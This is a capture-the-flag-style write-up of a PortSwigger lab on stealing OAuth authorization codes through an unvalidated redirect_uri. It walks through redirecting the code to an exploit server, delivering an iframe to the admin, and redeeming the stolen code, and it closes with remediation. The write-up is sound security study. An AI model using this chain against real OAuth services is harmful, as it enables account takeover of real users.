# OAuth Account Hijacking via redirect_uri

**Platform:** PortSwigger Web Security Academy
**Category:** OAuth 2.0 / Open Redirect / Account Takeover
**Difficulty:** Practitioner
**Date Solved:** 2026-10-28
**Severity:** Critical

## Summary

The same social-login setup seen across this OAuth learning path (blog app delegating authentication to an OAuth/OpenID provider), but with a different flaw this time: the authorization server validates `client_id` on the initial `/auth` request, but applies **no whitelist or exact-match validation to `redirect_uri`**. Any arbitrary value supplied as `redirect_uri` is accepted and used verbatim as the destination for the authorization code once the user authenticates. Since the authorization code is the thing an attacker actually needs to hijack a session (it's redeemable for a login), this is effectively a classic open redirect turned into a full authorization-code-theft primitive: point `redirect_uri` at attacker-controlled infrastructure, get the victim to trigger the flow, and the OAuth server hands the victim's authorization code straight to the attacker.

## Affected Component

- `GET /auth?client_id=...&redirect_uri=...&response_type=code&scope=openid%20profile%20email` — authorization request. `client_id` is validated against the registered client; `redirect_uri` is not validated against any registered/whitelisted value at all.
- `GET /oauth-callback?code=...` — the client application's own callback endpoint, which exchanges a valid, unused code for an authenticated session.

## Steps to Reproduce

1. Before testing anything, mapped the standard OAuth flow pattern from proxy history, to know exactly which request types to expect and what each one does:
   - `GET /auth?client_id=...&redirect_uri=...&response_type=code&scope=...` — **start**. The client app kicks off the flow, telling the OAuth server who it is (`client_id`), where to send the user back (`redirect_uri`), what it wants back (`response_type=code`), and what permissions it's requesting (`scope`).
   - `GET /interaction/...` — the OAuth server pauses here for the human: login form / consent screen, tracked by a unique interaction session ID.
   - `GET /auth?...` (resume) — after login/consent, the flow resumes against the same authorization endpoint.
   - `redirect_uri?code=XXX` — **handoff**. The OAuth server redirects back to the client with the authorization code as a query parameter; the client's backend exchanges this for an access token.
   - General pattern to recognize on any future OAuth target: `/auth (start) → [interaction/login] → /auth (resume) → redirect_uri?code=XXX (handoff)`.

2. Tested whether `redirect_uri` is actually validated against anything registered for this `client_id`. Sent:
   ```
   GET /auth?client_id=v24tl11aeyk7m6g0yihn8&redirect_uri=RANDOM_TOKEN&response_type=code&scope=openid%20profile%20email HTTP/2
   ```
   with `redirect_uri` set to an arbitrary, non-registered value. The server responded `302 Found` with a body containing:
   ```
   Redirecting to [REDIRECT_URI_VALUE]?code=RANDOM_TOKEN.
   ```
   Confirmed: the server accepts and redirects to **any** `redirect_uri` value with no whitelist or exact-match check — the open redirect is real and directly carries the authorization code with it.

3. **Mistake made here, worth documenting:** while exploring the callback behavior, manually replayed the same `code` value against `/oauth-callback` multiple times (once via Burp Repeater, once pasted directly in the browser, with a session cookie swapped in between). The first replay succeeded (`"You have successfully logged in with your social media account"`, fresh session cookie issued). The next two attempts both returned `500 Internal Server Error`.
   - **Wrong initial assumption:** thought the 500 was caused by hitting the callback on an "unauthenticated surface" — i.e., missing session state.
   - **Actual cause:** OAuth authorization codes are single-use. The first replay had already redeemed that exact code; the 500s on the following attempts were the server choking on an already-consumed/invalid code, not a session or authentication problem. Swapping the session cookie had no bearing on this at all. The fix wasn't re-establishing a session — it was simply using a fresh, unused code, which is what re-triggering the login flow via "My account" naturally provided.

4. With the open redirect behavior confirmed (step 2) and the single-use-code misunderstanding cleared up (step 3), followed the actual exploit chain:
   - Captured a fresh `GET /auth?client_id=...` request from a normal login.
   - In Repeater, changed `redirect_uri` to point at the exploit server instead of the real callback, sent it, and followed the redirect. Checked the exploit server's access log and confirmed a request landed there carrying a `code=...` parameter — proof the provider will leak authorization codes to attacker-controlled domains.
   - Built an iframe on the exploit server pointing at that same manipulated `/auth?...&redirect_uri=EXPLOIT-SERVER/...` URL.
   - Delivered to the victim (the always-logged-in admin). Their browser completed the OAuth flow, leaking the admin's own authorization code to the exploit server's access log.
   - Took the stolen code and immediately visited `https://YOUR-LAB-ID/oauth-callback?code=STOLEN-CODE` — once, before it could be invalidated by any other use.
   - Landed in the admin account. Accessed the admin panel and deleted `carlos` to solve the lab.

## Proof of Concept

**Confirming unvalidated `redirect_uri` (core vulnerability):**
```http
GET /auth?client_id=v24tl11aeyk7m6g0yihn8&redirect_uri=RANDOM_TOKEN&response_type=code&scope=openid%20profile%20email HTTP/2
```
**Response:**
```http
HTTP/2 302 Found

Redirecting to [REDIRECT_URI_VALUE]?code=RANDOM_TOKEN.
```
No error, no rejection — any `redirect_uri` is accepted and used as the code's destination.

**The code-reuse mistake, for reference (not the actual vulnerability, but worth keeping as a documented misstep):**

Successful first redemption of a code:
![Successful callback redemption](<../assets/redirect-uri-hijacking-successful-callback.png>)

Same code replayed afterward — 500 Internal Server Error (code already consumed, not a session issue):
![500 error on reused code, browser view](<../assets/redirect-uri-hijacking-reused-code-500-browser.png>)
![500 error on reused code, Burp view](<../assets/redirect-uri-hijacking-reused-code-500-burp.png>)

Lab solved by stealing the admin's authorization code via the manipulated `redirect_uri`, redeeming it once at `/oauth-callback`, and deleting `carlos` from the admin panel.

## Root Cause

The OAuth 2.0 specification requires authorization servers to validate `redirect_uri` against a pre-registered, exact-match value (or at minimum a strict whitelist) for the given `client_id`, specifically to prevent authorization codes from being redirected to attacker-controlled destinations. This server skips that check entirely — `redirect_uri` is treated as a trusted, client-supplied value with no server-side registration check at all. Since the authorization code is sufficient on its own to complete a login (redeemable at `/oauth-callback` for a session), controlling where that code gets sent is equivalent to controlling who gets to log in as the victim.

## Impact

**Technical**
- Full authorization-code theft and account takeover, requiring only that the victim's browser execute a single GET request (via iframe, image tag, or any other auto-triggering element) while they have an active OAuth session
- No password knowledge, no XSS, no additional chaining needed — the vulnerability is a single missing validation check
- Directly chainable into admin account takeover when the victim is a privileged, always-logged-in account, as demonstrated here

**Business / Real-World**
- `redirect_uri` validation gaps are one of the most common real-world OAuth misconfigurations and are explicitly called out in the OAuth 2.0 Security Best Current Practice (RFC 9700) specifically because of attacks like this one
- Unlike XSS-dependent token theft, this requires no injection point on the target at all — only the OAuth authorization endpoint itself
- Scales to any account reachable via the OAuth login path, with severity scaling directly with the privilege of whichever victim can be tricked into triggering the flow

**Scope**
- Any account authenticatable via this OAuth provider, including administrative accounts

## Remediation

- Enforce exact-match (or strict prefix/whitelist, per RFC 9700 guidance favoring exact match) validation of `redirect_uri` against a list of URIs registered at client-registration time. Reject any request where `redirect_uri` doesn't match exactly.
- Never construct the redirect response from a client-supplied value without validation — treat `redirect_uri` as untrusted input requiring the same rigor as any other user-controlled redirect target.
- Consider binding the authorization code to the exact `redirect_uri` it was issued against, so even a stolen code can't be redeemed via a different callback path.
- Implement PKCE (Proof Key for Code Exchange) as defense-in-depth — while it doesn't fix an unvalidated `redirect_uri` on its own, it reduces the blast radius of a leaked authorization code by requiring a code verifier only the legitimate client possesses.

## Lessons Learned & Patterns

- **Corrected assumption:** initially misattributed a `500 Internal Server Error` on repeated `/oauth-callback` requests to an "unauthenticated surface" issue. The actual cause was simpler and more fundamental — authorization codes are single-use, and the first replay had already consumed it. Swapping session cookies was irrelevant and never going to change the outcome. Lesson: before inventing a session/auth-state theory for an unexpected error, check whether the token/code being reused is still valid at all — single-use-token reuse is a much more common and boring explanation than it first appears.
- **Mapping the full OAuth request sequence before testing pays off.** Having the `/auth (start) → interaction → /auth (resume) → redirect_uri?code=XXX (handoff)` pattern clear beforehand made it immediately obvious which request to manipulate (`redirect_uri` on the initial `/auth` call) rather than guessing at random requests in proxy history.
- **`redirect_uri` is one of the first two or three things to test on any OAuth target**, alongside the presence/absence of `state` (CSRF, as in the Forced OAuth Profile Linking lab in this same path). A simple test — submit a non-registered `redirect_uri` and watch whether the server rejects it or blindly redirects — takes seconds and immediately reveals a Critical-severity primitive if it fails.
- **General pattern for this vuln class:** authorization-code-via-redirect_uri theft needs no other vulnerability to chain with — it's a complete attack on its own, unlike token-theft techniques that need an existing XSS or open redirect elsewhere in the app. Any OAuth integration is worth checking this on regardless of what else is or isn't present on the target.

## References

- PortSwigger Lab: OAuth account hijacking via redirect_uri
- RFC 9700: OAuth 2.0 Security Best Current Practice (redirect_uri validation guidance)
- RFC 6749 §3.1.2: OAuth 2.0 Redirection Endpoint

**Tags:** #PortSwigger #OAuth #OpenRedirect #AccountTakeover #AdminTakeover
